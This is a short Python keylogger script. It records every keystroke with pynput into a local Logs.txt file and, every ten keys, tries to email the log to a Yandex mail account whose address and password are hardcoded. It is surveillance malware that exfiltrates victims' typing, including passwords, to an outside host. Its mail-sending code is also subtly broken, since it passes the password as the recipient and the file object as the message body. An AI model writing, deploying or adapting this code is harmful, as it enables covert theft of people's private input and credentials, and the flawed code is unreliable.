from pynput.keyboard import Listener,Key
import smtplib
import sys
import datetime


counter = 0
caps = 0

def keyfunction(key):
    global counter 
    global caps

    with open("Logs.txt", "a") as logs:
        try:

            if key == Key.space:
                logs.write(" ")

            elif key == Key.enter:
                logs.write("\n")

            elif key == Key.backspace:
                logs.write(" dlt ")

            elif key == Key.caps_lock:
                caps +=1
                if caps ==1:
                    logs.write(" CAPS:")
                elif caps == 2:
                    logs.write(":CAPS")
                    caps = 0

            else:
                key = key.char
                logs.write(key)
        
        except:
            logs.close()
            sys.exit()


        finally:
            counter +=1
            print(key)

            if counter == 10:
                try:
                  a = "denemekeylogsmt@yandex.com"
                  p = "c99210cc77f0948ae554159294cf7966"

                  server = smtplib.SMTP("smtp.yandex.com", 465)
                  server.starttls()
                  server.login(a,p)
                  server.sendmail(a,p,logs)
                  server.quit()
                  counter = 0

                except:
                    server.quit()
                    logs.close()
                    sys.exit()

            else:
                pass


if __name__ == "__main__":
    listener = Listener(on_press = keyfunction)
    listener.start()
    input()